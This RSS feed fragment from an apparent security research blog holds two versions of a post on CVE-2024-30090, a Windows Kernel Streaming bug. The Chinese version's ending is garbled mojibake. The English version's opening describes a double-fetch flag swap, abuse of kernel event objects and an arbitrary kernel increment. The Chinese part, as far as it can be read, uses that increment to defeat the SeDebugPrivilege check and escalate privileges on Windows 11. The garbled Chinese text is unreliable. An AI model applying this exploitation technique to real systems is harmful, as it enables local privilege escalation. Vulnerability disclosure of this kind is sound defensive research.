&lt;p&gt;ä¸éæˆ‘å€‘å¯ä»¥æ³¨æ„åˆ°çš„æ˜¯ï¼Œå¤§éƒ¨åˆ†æƒ…æ³ä¸‹éƒ½æœƒæœ‰ SeChangeNotifyPrivilege ä¸”æ˜¯ Enable çš„ã€‚é€™æ™‚æˆ‘å€‘å°±å¯ä»¥ä¾†çœ‹çœ‹åˆå§‹åŒ–çš„åœ°æ–¹ï¼Œå°±å¯ç™¼ç¾ SeChangeNotifyPrivilege æ‰€ä»£è¡¨æ˜¯æ•¸å€¼ç‚º 0x17ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é‚£å¦‚æœæˆ‘å€‘åˆ©ç”¨æ¼æ´æŠŠ SeDebugPrivilege å¾ 0x14 æ›æˆ 0x17 æœƒç™¼ç”Ÿç”šéº¼äº‹æƒ…å‘¢?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¦‚ä¸Šåœ–ï¼Œåœ¨åŸå…ˆ OpenProcess çš„æµç¨‹ä¸­ï¼Œä¾èˆŠæœƒå…ˆå»çœ‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; ä¸­çš„æ•¸å€¼ï¼Œè€Œé€™æ™‚ç²å¾—çš„æ•¸å€¼ç‚º 0x17(SeChangeNotifyPrivilege)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ¥ä¸‹ä¾†çš„æª¢æŸ¥å°±æœƒä»¥ 0x17 å°ç•¶å‰ Process token åšé©—è­‰ï¼Œçœ‹çœ‹æœ‰æ²’æœ‰é€™å€‹ Privilegeï¼Œç„¶è€Œä¸€èˆ¬ä½¿ç”¨è€…éƒ½æœƒæœ‰é€™å€‹ Privilegeï¼Œå› æ­¤å³ä½¿ä½ æ²’æœ‰ SeDebugPrivilege ä¹Ÿæœƒç›´æ¥é€šéæª¢æŸ¥ï¼Œæ‹¿åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PROCESS_ALL_ACCESS&lt;/code&gt;ï¼Œ&lt;strong&gt;ä¹Ÿå°±æ˜¯èªªä»»ä½•æ“æœ‰ SeChangeNotifyPrivilege éƒ½å¯ä»¥ open é™¤äº† PPL ä¹‹å¤–çš„é«˜æ¬Šé™çš„ Process&lt;/strong&gt;ã€‚&lt;/p&gt;

&lt;p&gt;æ­¤å¤–åˆ©ç”¨æˆ‘å€‘ä¸Šè¿°çš„æ¼æ´ä¾†å°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; å¾ 0x14 æ”¹æˆ 0x17ï¼Œå› ç‚ºåŸæœ¬çš„æ•¸å€¼ä¸æ˜¯ 0 æ˜¯ä¸æœƒå—åˆ° KsQueueWorkItem å½±éŸ¿çš„ï¼Œå› æ­¤éå¸¸é©åˆæˆ‘å€‘ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨å¯ä»¥ open é«˜æ¬Šé™çš„ Process å¾Œï¼Œææ¬Šæ–¹å¼å°±èˆ‡ä¸€èˆ¬çš„ Abuse token privilege æ–¹æ³•ç›¸åŒå°±ä¸å†é€™é‚Šå¤šæäº†ï¼Œæœ€çµ‚æˆ‘å€‘åˆåœ¨ä¸€æ¬¡åˆ©ç”¨ Proxying to kernel æˆåŠŸåœ¨ Windows 11 23H2 ä¸Šé”æˆ EoPã€‚&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/m2TNVDgz7CI?si=YJQ9_u7xoyVt1wRm&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h4 id=&quot;remark&quot;&gt;Remark&lt;/h4&gt;
&lt;p&gt;å¯¦éš›ä¸Šä¾†èªªï¼Œé€™å€‹æ–¹æ³•ä¹Ÿé©ç”¨æ–¼å…¶ä»–é«˜æ¬Šé™çš„ Privilege ä¸­&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;SeTcbPrivilege = 0x7&lt;/li&gt;
  &lt;li&gt;SeTakeOwnershipPrivilege = 0x9&lt;/li&gt;
  &lt;li&gt;SeLoadDriverPrivilege = 0xa&lt;/li&gt;
  &lt;li&gt;â€¦&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;the-next--summary&quot;&gt;The Next &amp;amp; Summary&lt;/h2&gt;
&lt;p&gt;é€™å…©ç¯‡æ–‡ç« ä¸­ï¼Œä¸»è¦è‘—é‡æ–¼æˆ‘å€‘æ€éº¼å¾éå¾€çš„æ¼æ´åˆ†æåˆ°ç™¼ç¾æ–°æ¼æ´çš„éç¨‹ï¼Œå¦‚ä½•å¾éå»çš„ç ”ç©¶ä¹‹ä¸­ç²å¾—æ–°çš„æƒ³æ³•ã€æ–°çš„åˆ©ç”¨æ–¹å¼ï¼Œæ–°çš„æ¼æ´ä»¥åŠæ–°çš„æ”»æ“Šé¢ã€‚é—œæ–¼é€™ç¨® Proxy é¡å‹çš„ Bug class å¯èƒ½é‚„å­˜åœ¨å¾ˆå¤šï¼Œä¹Ÿå¯èƒ½ä¸åªä¾·é™æ–¼ Kernel Streaming å’Œ &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest&quot;&gt;IoBuildDeviceIoControlRequest&lt;/a&gt;ï¼Œæˆ‘èªç‚ºç®—æ˜¯ Windows è¨­è¨ˆä¸Šçš„ä¸€å€‹å°ç¼ºé™·ï¼Œå¦‚æœèªçœŸæ‰¾å¯èƒ½é‚„æœƒæ‰¾åˆ°ä¸€äº›æ¼æ´ï¼Œé€™é¡å‹çš„æ¼æ´ä½ éœ€è¦é—œæ³¨çš„åœ°æ–¹å°±æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; è¨­ç½®çš„æ™‚é–“é»ï¼Œå¦‚æœè¨­ç½® KernelMode ä¹‹å¾Œé‚„æœ‰æ‹¿ä½¿ç”¨è€…çš„è¼¸å…¥åšäº‹æƒ…ï¼Œå°±æœ‰æ©Ÿæœƒå‡ºå•é¡Œï¼Œè€Œä¸”é€™é¡å‹çš„æ¼æ´å¾€å¾€éƒ½å¾ˆå¥½ç”¨ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨ Kernel Streaming ä¸­ï¼Œæˆ‘èªç‚ºæ‡‰è©²ä¸å°‘æ½›åœ¨çš„å®‰å…¨æ€§æ¼æ´ï¼Œä»–ä¹Ÿé‚„æœ‰å¾ˆå¤šå…ƒä»¶åƒæ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hdaudio.sys&lt;/code&gt; æˆ–æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Usbvideo.sys&lt;/code&gt; å¯èƒ½ä¹Ÿæ˜¯å€‹å¯ä»¥çœ‹çš„æ–¹å‘ï¼Œä¹Ÿæ˜¯å€‹é©åˆ fuzzing çš„åœ°æ–¹ã€‚å¦‚æœä½ æ˜¯å€‹ Kernel driver é–‹ç™¼è€…æœ€å¥½ä¸è¦åªæœ‰æª¢æŸ¥ Irp-&amp;gt;Requestormodeï¼ŒWindows æ¶æ§‹ä¸‹å¾ˆæœ‰å¯èƒ½é‚„æ˜¯æœ‰å•é¡Œã€‚æœ€å¾Œå†æ¬¡å¼·çƒˆå»ºè­°å¤§å®¶ç›¡é€Ÿæ›´æ–° Windows åˆ°æœ€æ–°ç‰ˆæœ¬ä¸­ã€‚&lt;/p&gt;

&lt;h2 id=&quot;is-that-the-end-of-it-&quot;&gt;Is that the end of it ?&lt;/h2&gt;
&lt;p&gt;å¯¦éš›ä¸Šä¾†èªªé™¤äº† Proxy é¡å‹çš„æ¼æ´ä¹‹å¤–ï¼Œæˆ‘å€‘é‚„æœ‰æ‰¾åˆ°å…¶ä»–æ›´å¤šçš„ Bug class ä½¿å¾—æˆ‘å€‘åœ¨ Kernel Streaming ä¸Šæ‰¾åˆ°è¶…é 20 å€‹æ¼æ´ï¼Œæœ‰äº›æ¼æ´éå¸¸ç‰¹åˆ¥ï¼Œæ•¬è«‹æœŸå¾… Part IIIã€‚&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;Easy Local Windows Kernel Exploitation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/&quot;&gt;One I/O Ring to Rule Them All: A Full Read/Write Exploit Primitive on Windows 11
&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2/</link>
                <guid>https://devco.re/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2</guid>
                <pubDate>Sat, 05 Oct 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part II</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This is a series of research related to Kernel Streaming attack surface. It is recommended to read the following articles first.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/&quot;&gt;Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part I&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In the previous research on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Proxying to Kernel&lt;/code&gt;, we discovered multiple vulnerabilities in Kernel Stearming as well as an overlooked bug Class. We successfully exploited vulnerabilities CVE-2024-35250 and CVE-2024-30084 to compromise Windows 11 at Pwn2Own Vancouver 2024.&lt;/p&gt;

&lt;p&gt;In this article, we will continue to explore this attack surface and bug Class, revealing another vulnerability and exploitation technique, which was also presented at &lt;a href=&quot;https://www.hexacon.fr/&quot;&gt;HEXACON 2024&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;After Pwn2Own Vancouver 2024, we continued to investigate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!KsSynchronousIoControlDevice&lt;/code&gt; bug pattern to see if there were any other security issues. However, after some time, we did not find any other exploitable points in the property operations of KS object. Therefore, we shifted our focus to another feature, KS Event.&lt;/p&gt;

&lt;h2 id=&quot;ks-event&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ks-events&quot;&gt;KS Event&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Similar to the &lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/#ks-property&quot;&gt;KS Property&lt;/a&gt; mentioned in the previous article, the KS object not only has its own property set but also provides the functionality to set KS Event. For instance, you can set an event to trigger when the device status changes or at regular intervals, which is convenient for developers of playback software to define subsequent behaviors. Each KS Event, like a property, requires the KS object to support it to be used. We can register or disable these Events through &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_enable_event&quot;&gt;IOCTL_KS_ENABLE_EVENT&lt;/a&gt; and &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_disable_event&quot;&gt;IOCTL_KS_DISABLE_EVENT&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;kseventdata&quot;&gt;KSEVENTDATA&lt;/h3&gt;
&lt;p&gt;When registering a KS Event, you can register the desired event by providing &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ns-ks-kseventdata&quot;&gt;KSEVENTDATA&lt;/a&gt;. You can include handles such as EVENT_HANDLE and SEMAPHORE_HANDLE in the registration. When KS triggers this event, it will notify you using the provided handle.&lt;/p&gt;

&lt;h3 id=&quot;the-work-flow-of-ioctl_ks_enable_event&quot;&gt;The work flow of IOCTL_KS_ENABLE_EVENT&lt;/h3&gt;
&lt;p&gt;The entire work flow is similar to IOCTL_KS_PROPERTY. When calling DeviceIoControl, as shown in the figure below, the userâ€™s requests are sequentially passed to the corresponding driver for processing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Similarly, in step 3, 32-bit requests will be converted into 64-bit requests. By step 6, ks.sys will determine which driver and &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/nc-ks-pfnksaddevent&quot;&gt;addhandler&lt;/a&gt; to handle your request based on the event of your requests.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, forward it to the corresponding driver. As shown in the figure above, it is finally forwarded to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsiDefaultClockAddMarkEvent&lt;/code&gt; in ks to set the &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-kesettimerex&quot;&gt;timer&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;After grasping the KS Event functionality and process, we swiftly identified another exploitable vulnerability, &lt;a href=&quot;https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-30090&quot;&gt;CVE-2024-30090&lt;/a&gt;, based on the previousÂ &lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/#the-new-bug-pattern&quot;&gt;bug pattern&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;proxying-to-kernel-again-&quot;&gt;Proxying to kernel again !&lt;/h2&gt;

&lt;p&gt;This time, the issue occurs whenÂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk&lt;/code&gt;Â converts a 32-bit request into a 64-bit one.&lt;/p&gt;

&lt;p&gt;As shown in the figure below, when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk&lt;/code&gt; receives an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_ENABLE_EVENT&lt;/code&gt; request and the request is from a WoW64 Process, it will perform the conversion from a 32-bit structure to a 64-bit structure.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The conversion would call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk!CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt; to handle it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;__int64 __fastcall CKSAutomationThunk::ThunkEnableEventIrp(__int64 ioctlcode_d, PIRP irp, __int64 a3, int *a4)
{
  ...
  if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLE
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ONESHOT
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLEBUFFERED )  
  {
    // Convert 32-bit requests and pass down directly
  }
  else if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_QUERYBUFFER ) 
  {
    ...
    newinputbuf = (KSEVENT *)ExAllocatePoolWithTag((POOL_TYPE)0x600, (unsigned int)(inputbuflen + 8), &apos;bqSK&apos;);
    ...
    memcpy(newinputbuf,Type3InputBuffer,0x28);  //------------------------[1]
    ...
    v18 = KsSynchronousIoControlDevice( 
            v25-&amp;gt;FileObject,
            0,
            IOCTL_KS_ENABLE_EVENT,
            newinputbuf,
            inputbuflen + 8,
            OutBuffer,
            outbuflen,
            &amp;amp;BytesReturned);  //-----------------[2]
    ...
  }
  ...
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt;, a similar bug pattern is clearly visible. You can see that during the processing, the original request is first copied into a newly allocated buffer at [1]. Subsequently, this buffer is used to call the new IOCTL using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; at [2]. Both &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;newinputbuf&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OutBuffer&lt;/code&gt; are controlled by the user.&lt;/p&gt;

&lt;p&gt;The flow when calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt; is illustrated as follows:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When calling IOCTL in a WoW64 process, you can see in step 2 of the diagram that the I/O Manager sets &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; to UserMode(1). In step 3, ksthunk converts the userâ€™s request from 32-bit to 64-bit, handled by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Afterward, in step 5, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; will be called to issue the IOCTL, and at this point, the new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; has become &lt;strong&gt;KernelMode(0)&lt;/strong&gt;. The subsequent processing is the same as a typical &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_ENABLE_EVENT&lt;/code&gt;, so it wonâ€™t be detailed further. In summary, we now have a primitive that allows us to perform arbitrary &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_ENABLE_EVENT&lt;/code&gt; with KernelMode. Next, we need to look for places where we can achieve EoP.&lt;/p&gt;

&lt;h2 id=&quot;the-exploitation&quot;&gt;The Exploitation&lt;/h2&gt;
&lt;p&gt;Following the &lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/#the-eop&quot;&gt;previous approach&lt;/a&gt;, we first analyzed the entry point &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk&lt;/code&gt;. However, after searching for a while, we found no potential privilege escalation points. In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk&lt;/code&gt;, most instances where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestMode&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode(0)&lt;/code&gt; are directly passed down without additional processing. Therefore, we shifted our eyes to the next layer, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks&lt;/code&gt;, to see if there are any opportunities for privilege escalation during the event handling process.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Quickly, we found a place that caught our attention.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KspEnableEvent&lt;/code&gt; handler, a code snippet first checks the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NotificationType&lt;/code&gt; in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENTDATA&lt;/code&gt; you passed in to determine how to register and handle your event. In general, it usually provides an &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createeventa&quot;&gt;EVENT_HANDLE&lt;/a&gt; or a &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createsemaphorea&quot;&gt;SEMAPHORE_HANDLE&lt;/a&gt;. However, in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks&lt;/code&gt;, if called from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt;, we can provide an &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/event-objects&quot;&gt;Event Object&lt;/a&gt; or even a &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/introduction-to-dpc-objects&quot;&gt;DPC Object&lt;/a&gt; to register your event, making the overall handling more efficient.&lt;/p&gt;

&lt;p&gt;This means we can use this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DeviceIoControl&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt; primitive to provide a &lt;strong&gt;kernel object&lt;/strong&gt; for subsequent processing. If constructed well, it might achieve &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EoP&lt;/code&gt;, but it depends on how this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Object&lt;/code&gt; is used later.&lt;/p&gt;

&lt;p&gt;However, after trying for a while, we discovered that â€¦&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;__int64 __fastcall CKSAutomationThunk::ThunkEnableEventIrp(__int64 ioctlcode_d, PIRP irp, __int64 a3, int *a4)
{
  ...
  if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLE
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ONESHOT
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLEBUFFERED )  //-------[3]
  {
    // Convert 32-bit requests and pass down directly
  }
  else if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_QUERYBUFFER ) //-------[4]
  {
    ...
    newinputbuf = (KSEVENT *)ExAllocatePoolWithTag((POOL_TYPE)0x600, (unsigned int)(inputbuflen + 8), &apos;bqSK&apos;);
    ...
    memcpy(newinputbuf,Type3InputBuffer,0x28); //------[5] 
    ...
    v18 = KsSynchronousIoControlDevice( 
            v25-&amp;gt;FileObject,
            0,
            IOCTL_KS_ENABLE_EVENT,
            newinputbuf,
            inputbuflen + 8,
            OutBuffer,
            outbuflen,
            &amp;amp;BytesReturned);  
    ...
  }
  ...
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you want to provide a kernel object to register an event, then the flag given in the IOCTL for &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/stream/ksevent-structure&quot;&gt;KSEVENT&lt;/a&gt; must be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_ENABLE&lt;/code&gt; at [3]. However, at [4], where the vulnerability is triggered, it must be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_QUERYBUFFER&lt;/code&gt;, and it is impossible to directly provide a kernel object as we might have expected.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Fortunately, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_ENABLE_EVENT&lt;/code&gt; also uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Neither I/O&lt;/code&gt; to transmit data. It also presents a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Double Fetch&lt;/code&gt; issue &lt;strong&gt;again&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown in the figure above, we can set the flag to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_QUERYBUFFER&lt;/code&gt; before calling IOCTL. When checking, it will handle it with  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_QUERYBUFFER&lt;/code&gt;. Before the second &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; call, we can change the flag to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_ENABLE&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This way, we can successfully trigger the vulnerability and construct a specific kernel object to register the event.&lt;/p&gt;

&lt;h3 id=&quot;trigger-the-event&quot;&gt;Trigger the event&lt;/h3&gt;
&lt;p&gt;When would it use the kernel object that you constructed? When an event is triggered, ks will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!ksGenerateEvent&lt;/code&gt; through DPC. At this point, it will determine how to handle your event based on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NotificationType&lt;/code&gt; you specified.&lt;/p&gt;

&lt;p&gt;Letâ€™s take a look at KsGenerateEvent&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;NTSTATUS __stdcall KsGenerateEvent(PKSEVENT_ENTRY EventEntry)
{

  switch ( EventEntry-&amp;gt;NotificationType )
  {
    case KSEVENTF_DPC:
      ...
      if ( !KeInsertQueueDpc(EventEntry-&amp;gt;EventData-&amp;gt;Dpc.Dpc, EventEntry-&amp;gt;EventData, 0LL) )
        _InterlockedAdd(&amp;amp;EventEntry-&amp;gt;EventData-&amp;gt;EventObject.Increment, 0xFFFFFFFF); //--------[6]
      ...
    case KSEVENTF_KSWORKITEM:
      ...
      KsIncrementCountedWorker(eventdata-&amp;gt;KsWorkItem.KsWorkerObject); //-----------[7]

  }
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;At this point, there are multiple ways to exploit this. The most straightforward method is to directly construct a DPC structure and queue a DPC to achieve arbitrary kernel code execution, which corresponds to the code snippet at [6]. However, the IRQL when calling KsGenerateEvent is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DISPATCH_LEVEL&lt;/code&gt;, making it very difficult to construct a DPC object in User space, and the exploitation process will encounter many issues.&lt;/p&gt;

&lt;p&gt;Therefore, we opt for an alternative route usingÂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENTF_KSWORKITEM&lt;/code&gt;Â at [7]. This method involves passing in a kernel address and manipulating it to be recognized as a pointer toÂ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ns-ks-kseventdata&quot;&gt;KSWORKITEM&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It can achieve an arbitrary kernel address increment by one. The entire process is illustrated in the diagram below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_ENABLE_EVENT&lt;/code&gt;, after constructing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENTDATA&lt;/code&gt; to point to a kernel memory address, ks will handle it as a kernel object and register the specified event.&lt;/p&gt;

